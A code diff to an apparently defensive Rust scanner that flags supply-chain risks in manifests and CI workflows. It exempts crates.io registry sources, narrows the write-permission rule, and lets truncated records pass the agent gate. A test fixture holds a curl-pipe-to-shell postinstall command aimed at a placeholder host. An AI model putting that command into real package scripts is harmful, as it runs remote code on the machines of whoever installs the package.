@@ -533,9 +533,6 @@ fn gate_incomplete_reasons(coverage: &AgentGateCoverage, policy: &Policy) -> Vec
             coverage.serialization_failed
         ));
     }
-    if coverage.record_truncated > 0 {
-        reasons.push(format!("record_truncated={}", coverage.record_truncated));
-    }
     if coverage.candidate_files > 0
         && coverage.dehydrated_files == 0
         && coverage.suspicious_artifacts.is_empty()
@@ -1134,9 +1131,6 @@ fn looks_like_pull_request_target(text: &str) -> bool {
 fn looks_like_write_all_permissions(text: &str) -> bool {
     let lower = text.to_ascii_lowercase();
     lower.contains("permissions: write-all")
-        || (lower.trim_start().starts_with("contents: write")
-            || lower.trim_start().starts_with("actions: write")
-            || lower.trim_start().starts_with("packages: write"))
 }
 
 fn is_dockerfile_path(path: &str) -> bool {
@@ -1272,12 +1266,7 @@ fn push_manifest_risks(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, 
         }
         for loc in &row.locations {
             let lower = loc.text.to_ascii_lowercase();
-            if lower.contains("git+")
-                || lower.contains("git =")
-                || lower.contains("git=")
-                || lower.contains("git:")
-                || lower.contains("github.com/")
-            {
+            if looks_like_git_dependency_source(&row.path, &loc.text) {
                 push_unique(
                     out,
                     seen,
@@ -1292,11 +1281,7 @@ fn push_manifest_risks(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, 
                     },
                 );
             }
-            if (lower.contains("http://") || lower.contains("https://"))
-                && !lower.contains("registry.npmjs.org")
-                && !lower.contains("crates.io")
-                && !lower.contains("pypi.org")
-            {
+            if looks_like_external_dependency_url(&row.path, &loc.text) {
                 push_unique(
                     out,
                     seen,
@@ -1407,6 +1392,34 @@ fn is_manifest_or_lockfile_path(path: &str) -> bool {
             | "uv.lock"
             | "pdm.lock"
     )
+}
+
+fn looks_like_git_dependency_source(path: &str, text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    if is_known_registry_dependency_source(path, &lower) {
+        return false;
+    }
+    lower.contains("git+")
+        || lower.contains("git =")
+        || lower.contains("git=")
+        || lower.contains("git:")
+        || lower.contains("github.com/")
+}
+
+fn looks_like_external_dependency_url(path: &str, text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    (lower.contains("http://") || lower.contains("https://"))
+        && !is_known_registry_dependency_source(path, &lower)
+}
+
+fn is_known_registry_dependency_source(path: &str, lower_text: &str) -> bool {
+    lower_text.contains("registry.npmjs.org")
+        || lower_text.contains("crates.io")
+        || lower_text.contains("pypi.org")
+        || (normalized_path(path)
+            .to_ascii_lowercase()
+            .ends_with("cargo.lock")
+            && lower_text.contains("registry+https://github.com/rust-lang/crates.io-index"))
 }
 
 fn sanitize_evidence(text: &str) -> String {
@@ -1526,6 +1539,38 @@ mod tests {
     }
 
     #[test]
+    fn agent_gate_keeps_compressed_records_complete() {
+        let report = agent_gate_from_seed(
+            "",
+            AgentGateCoverage {
+                candidate_files: 1,
+                dehydrated_files: 1,
+                record_truncated: 1,
+                seed_bytes: 128,
+                truncated_records: vec![TruncatedRecord {
+                    path: "Cargo.lock".to_string(),
+                    original_bytes: 100_000,
+                    compacted_bytes: 4096,
+                    reason: "compact_record_limits".to_string(),
+                }],
+                ..Default::default()
+            },
+        );
+
+        assert!(report.safe_to_agent_run);
+        assert!(report.markdown.contains("VERDICT: ACCEPT"));
+        assert!(report.markdown.contains("TRUNCATED_RECORDS:"));
+        assert!(
+            !report
+                .markdown
+                .contains("coverage requires review: record_truncated=1")
+        );
+        let json: serde_json::Value = serde_json::from_str(&report.json).unwrap_or_default();
+        assert_eq!(json["verdict"], "ACCEPT");
+        assert_eq!(json["coverage"]["record_truncated"], 1);
+    }
+
+    #[test]
     fn flags_npm_lifecycle_download_execute() {
         let seed = r#"{"path":"package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
         let findings = findings_from_seed(seed);
@@ -1613,6 +1658,50 @@ mod tests {
                 .filter(|f| f.rule == "unpinned-github-action")
                 .count(),
             1
+        );
+    }
+
+    #[test]
+    fn flags_broad_but_not_scoped_workflow_write_permissions() {
+        let broad = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":3,"text":"permissions: write-all"}]}"#;
+        let scoped = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":9,"text":"  contents: write"}]}"#;
+
+        let broad_findings = findings_from_seed(broad);
+        assert!(broad_findings.iter().any(|f| {
+            f.rule == "workflow-write-all" && f.severity == Severity::High && f.line == Some(3)
+        }));
+
+        let scoped_findings = findings_from_seed(scoped);
+        assert!(
+            !scoped_findings
+                .iter()
+                .any(|f| f.rule == "workflow-write-all")
+        );
+        assert!(scoped_findings.is_empty());
+    }
+
+    #[test]
+    fn ignores_cargo_lock_crates_io_registry_source() {
+        let seed = r#"{"path":"Cargo.lock","locations":[{"kind":"signature","line":8,"text":"source = \"registry+https://github.com/rust-lang/crates.io-index\""}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule == "dependency-git-source" || f.rule == "dependency-http-source"),
+            "Cargo registry metadata should not be dependency-source risk: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn still_flags_real_git_dependency_sources() {
+        let seed = r#"{"path":"Cargo.toml","locations":[{"kind":"signature","line":7,"text":"helper = { git = \"https://github.com/example/helper.git\", branch = \"main\" }"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(
+            findings
+                .iter()
+                .any(|f| { f.rule == "dependency-git-source" && f.severity == Severity::Medium })
         );
     }
 
